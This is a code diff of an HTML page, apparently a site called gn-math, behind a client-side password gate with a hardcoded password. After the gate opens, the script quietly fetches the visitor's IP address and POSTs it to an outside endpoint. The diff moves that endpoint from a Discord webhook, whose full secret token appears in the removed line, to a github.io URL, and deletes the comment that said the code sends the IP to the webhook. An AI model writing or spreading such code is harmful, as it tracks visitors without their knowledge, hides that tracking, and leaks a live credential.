@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -57,16 +56,15 @@
         if (document.getElementById('passwordInput').value.trim() === 'DrPepper') {
             document.getElementById('passwordGate').remove();
 
-            // Anti-spam: only log once per day per visitor
+            // Anti-spam: only one log per person per day
             const today = new Date().toDateString();
             if (localStorage.getItem('gn_logged') === today) return;
             localStorage.setItem('gn_logged', today);
-
-            // Send IP + info to your Discord webhook
+            
             fetch('https://api.ipify.org?format=json')
                 .then(r => r.json())
                 .then(data => {
-                    fetch('https://discord.com/api/webhooks/1444174098149277790/4n5lh8XSSxwibbKdYYRSGAXZMA41dvaqccqHI-1navjvO1ze2Dp6ShwtxxUhUyR7pZpa', {
+                    fetch('https://gn-math.github.io/w.php', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
